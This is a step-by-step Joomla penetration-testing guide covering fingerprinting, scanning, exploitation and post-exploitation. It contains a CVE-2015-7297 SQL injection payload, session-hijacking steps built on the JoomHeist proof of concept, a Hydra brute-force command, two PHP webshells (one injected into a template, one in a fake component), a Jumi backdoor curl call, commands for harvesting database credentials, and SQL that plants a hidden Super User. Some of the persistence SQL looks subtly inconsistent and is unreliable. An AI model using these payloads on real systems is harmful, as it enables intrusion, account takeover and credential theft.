# Complete Joomla Penetration Testing Methodology

This guide provides a comprehensive, step-by-step approach to testing Joomla CMS security, based on real-world attack patterns and actual exploits used in the wild.


## Phase 1: Information Gathering and Fingerprinting

### 1.1 Initial Reconnaissance

The first step is identifying whether the target runs Joomla and determining its exact version. Version information is critical because exploits are version-specific.

**Manual Fingerprinting Methods:**

```bash
# Check common Joomla signature files
curl -k https://target.com/README.txt | head -20
curl -k https://target.com/administrator/manifests/files/joomla.xml
curl -k https://target.com/plugins/system/cache/cache.xml
curl -k https://target.com/LICENCE.txt
curl -k https://target.com/htaccess.txt

# Check HTTP response headers
curl -I https://target.com | grep -i "generator"
curl -I https://target.com | grep -i "x-powered-by"

# Check for the administrator directory
curl -k https://target.com/administrator/ -I
```

**Real-World Example:** In the 2015 Joomla 3.4.4 mass exploitation campaign, attackers first scanned for `/administrator/manifests/files/joomla.xml`. When this file was accessible, it revealed the exact version, allowing attackers to filter vulnerable targets.

### 1.2 Automated Scanning with Joomscan

Joomscan (OWASP Joomla Vulnerability Scanner) is the industry standard tool for Joomla enumeration. It comes pre-installed in Kali Linux .

**Basic Scan:**
```bash
joomscan -u http://10.11.1.111
```

**Enumerate Components (Most Important):**
```bash
joomscan -u http://10.11.1.111 --enumerate-components
```

**What Joomscan Detects:**
- Joomla version number
- Vulnerable core files
- Directory listing exposures
- Accessible configuration files
- Admin login page location
- Interesting paths from robots.txt
- Installed third-party components

**Sample Output from Real Engagement:**
```
[+] Detecting Joomla Version
[++] Joomla 3.4.4

[+] Core Joomla Vulnerability
[++] Target Joomla core is vulnerable to CVE-2015-7297 (SQL Injection)

[+] Checking Directory Listing
[++] directory has directory listing :
http://target/administrator/components

[+] Admin page : http://target/administrator/
```

### 1.3 Advanced Enumeration Tools

**Droopescan** - Multi-CMS scanner with Joomla support:
```bash
droopescan scan joomla -u http://10.11.1.111
```

**CMSeeK** - CMS detection with version fingerprinting:
```bash
python3 cmseek.py -u https://domain.com
```

**Vulnx** - CMS fingerprinting with exploitation modules:
```bash
vulnx -u https://example.com/ --cms --dns -d -w -e
```


## Phase 2: Vulnerability Discovery

### 2.1 Using Burp Suite for Joomla Testing

Burp Suite is essential for manual Joomla testing. The **Vulners Scanner** extension automatically identifies known Joomla vulnerabilities while you browse the target .

**Setting Up Burp for Joomla Testing:**

1. Configure Burp as your browser proxy (127.0.0.1:8080)
2. Install Vulners Scanner extension from BApp Store
3. Browse the Joomla site normally
4. The extension identifies Joomla version and displays relevant CVEs

**Manual Parameter Testing in Burp:**

Send requests to Repeater and test these parameters for injection:
- `?option=com_contenthistory&view=history&list[select]=`
- `?option=com_fields&view=fields&layout=modal&list[fullordering]=`
- `?option=com_users&view=registration`

### 2.2 The Joomla Content History SQL Injection (CVE-2015-7297)

This is the most famous Joomla vulnerability, affecting versions 3.2 through 3.4.4. Attackers actively exploited this within 72 hours of public disclosure.

**Vulnerability Details:**
- **Component affected:** `com_contenthistory` (Content History component)
- **Vulnerable parameter:** `list[select]` GET parameter
- **Attack type:** Error-based SQL injection
- **Impact:** Extract active admin session IDs and hijack administrator accounts 

**How the Exploit Works:**

The vulnerability exists because the `list[select]` parameter is passed directly to SQL queries without sanitization. Attackers inject SQL code that triggers MySQL duplicate entry errors, and the error messages reveal database contents.

**Automated Exploitation with JoomHeist:**

JoomHeist is a Python PoC that fully automates the exploitation process .

```bash
# Clone the tool
git clone https://github.com/kaotickj/JoomHeist
cd JoomHeist

# Edit the TARGET variable in the script to your target URL
# TARGET = "http://10.11.1.111/index.php"

# Run the exploit
python3 joomla_sqli_poc.py
```

**What JoomHeist Does Automatically:**

1. **Detects database table prefix** - Joomla databases use configurable prefixes like `jos_`, `jml_`, `abc12_`. The script triggers an error that reveals this prefix.

2. **Enumerates Super Users** - Queries the `*_users` table for users belonging to group_id=8 (Super Administrator).

3. **Extracts active session IDs** - Queries the `*_session` table for sessions where `data` contains "Super User".

4. **Identifies cookie name** - Detects the Joomla session cookie name (varies by installation).

5. **Provides ready-to-use cookie** - Outputs a complete cookie string for session hijacking.

**Example Output:**
```
[+] Target: http://10.11.1.111/index.php
[+] Detected table prefix: jos_
[+] Found Super User: administrator
[+] Found active Super User session: cl16d18nr00pqm077ohurhqtk3
[+] Detected cookie name: joomla_session
[+] Use this cookie string: joomla_session=cl16d18nr00pqm077ohurhqtk3
```

**Using the Hijacked Session:**

```bash
# With curl
curl -b 'joomla_session=cl16d18nr00pqm077ohurhqtk3' http://target/administrator/

# In Firefox - Open Developer Tools > Storage > Cookies
# Add new cookie with name "joomla_session" and the extracted value
# Refresh the /administrator/ page - you are now logged in as admin
```

### 2.3 Manual SQL Injection Testing

If automated tools fail, manual testing is performed using Burp Suite.

**Step 1: Identify the vulnerable endpoint**
```
GET /index.php?option=com_contenthistory&view=history&list[select]= HTTP/1.1
Host: target.com
```

**Step 2: Test for error-based injection**
```
/list[select]= (select 1 from(select count(*),concat((select(substring(table_name,1,1)) from information_schema.tables where table_name like '%_users'),floor(rand(0)*2))x from information_schema.tables group by x)a)
```

**Step 3: Look for MySQL errors in response** - If the page returns errors containing table names, it's vulnerable.

### 2.4 Brute Force Testing with Hydra

Joomla administrator login is typically at `/administrator/`. Hydra can test for weak credentials, though it requires careful parameter identification .

**Finding Login Parameters:**

1. Navigate to `http://target/administrator/`
2. Open Browser Developer Tools (F12) > Network tab
3. Submit a fake login
4. Capture the POST request details

**Hydra Command for Joomla:**
```bash
hydra -L users.txt -P passwords.txt target.com http-form-post \
  "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Login failed"
```

**Important Note:** Hydra often struggles with Joomla's CSRF tokens. The **Pentest-Tools.com Password Auditor** is more reliable because it handles token extraction automatically and provides screenshot verification of successful logins .


## Phase 3: Exploitation

### 3.1 Gaining Code Execution via Admin Access

Once administrator access is obtained, there are multiple paths to Remote Code Execution (RCE).

**Method 1: Template Modification (Most Stealthy)**

This technique involves injecting PHP code into the active template's `index.php` file. It is stealthy because template files are expected to contain PHP code.

```bash
# Steps after admin login:
# Navigate to: Extensions > Templates > Styles
# Click on the default template (e.g., Protostar)
# Open index.php
# Add a webshell at the top or bottom

# Example webshell:
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>

# Save the file
# Access: http://target/?cmd=id
```

**Real-World Case - HackTheBox "Office" Machine:**
In this penetration testing challenge, attackers gained Joomla admin access and exploited a PHP template to achieve RCE. This was the initial foothold that led to full domain compromise .

**Method 2: Malicious Component Installation**

Create a ZIP file containing a fake Joomla component with a backdoor.

**Component Structure:**
```
shell.zip/
├── shell.xml
└── shell.php
```

**shell.xml content:**
```xml
<?xml version="1.0" encoding="utf-8"?>
<extension type="component" version="3.0" method="upgrade">
    <name>System Shell</name>
    <version>1.0.0</version>
    <description>System component</description>
</extension>
```

**shell.php content:**
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
```

**Installation:**
- Log into Joomla administrator
- Go to: Extensions > Manage > Install
- Upload the ZIP file
- Access: `http://target/index.php?option=com_shell&cmd=id`

**Method 3: Jumi Component Exploitation**

The Jumi component (versions ≤ 2.0.5) contained a known backdoor that allowed unauthenticated RCE . Attackers can exploit this without credentials:

```bash
# Direct backdoor access
curl "http://target/modules/mod_mainmenu/tmpl/.config.php?key=Jumi&php=system('id');"
```

### 3.2 Jmail Service Exploitation

Check Point Research discovered a campaign where attackers exploited Joomla's Jmail service to send phishing emails and create backdoors .

**How Attackers Exploited Jmail:**
By manipulating the User-Agent header in HTTP requests, attackers could replace the legitimate Jmail service with malicious code. This allowed them to:
- Send spam/phishing emails through compromised servers
- Create persistent backdoors within the Joomla platform

The attacker known as "Alarg53" used this technique to compromise over 15,000 websites, including Stanford University servers .


## Phase 4: Post-Exploitation

### 4.1 Credential Harvesting

After gaining access, extract database credentials from `configuration.php`:

```bash
# Location of configuration file
/var/www/html/configuration.php
/home/username/public_html/configuration.php
/var/www/joomla/configuration.php

# Extract credentials
cat configuration.php | grep -E "user|password|db"
```

**Typical configuration.php excerpt:**
```php
public $user = 'joomla_db_user';
public $password = 'S3cureP@ssw0rd';
public $db = 'joomla_db_name';
public $host = 'localhost';
```

These database credentials are often reused on other services (SSH, FTP, other CMS installations).

### 4.2 Backdoor Persistence

**Creating a Hidden Admin User:**
```sql
-- Insert a new Super User directly into database
INSERT INTO `jos_users` 
(name, username, email, password, block, sendEmail, registerDate, lastvisitDate, activation, params, group_id)
VALUES 
('Hidden Admin', 'backdoor', 'backdoor@target.com', 
 MD5('password123'), 0, 0, NOW(), NOW(), '', '', 8);

-- Assign to Super Administrator group
INSERT INTO `jos_user_usergroup_map` (user_id, group_id)
VALUES (LAST_INSERT_ID(), 8);
```


## Phase 5: Testing Methodology Summary

### Complete Testing Checklist

| Phase | Actions | Tools |
|-------|---------|-------|
| Fingerprinting | Check README.txt, manifest files, headers | curl, Burp Suite |
| Scanning | Run automated vulnerability scan | Joomscan, Droopescan |
| Component Enumeration | List installed components | Joomscan -ec |
| Version Assessment | Compare version against CVE database | Vulners Scanner |
| SQL Injection Testing | Test com_contenthistory parameter | JoomHeist, Burp Repeater |
| Brute Force | Test admin login weakness | Password Auditor, Hydra |
| Exploitation | Gain code execution via template/component | Manual, Jumi backdoor |
| Persistence | Extract credentials, create backdoor | Manual SQL, webshell |

### Legal and Ethical Note

All testing must be performed only on systems you own or have explicit written permission to test. Unauthorized access violates laws including the Computer Fraud and Abuse Act (CFAA) and similar legislation worldwide.

### References for Further Study

- JoomHeist GitHub: https://github.com/kaotickj/JoomHeist
- OWASP JoomScan: Pre-installed in Kali Linux
- CVE Database: https://app.opencve.io/cve/?product=joomla%5C%21
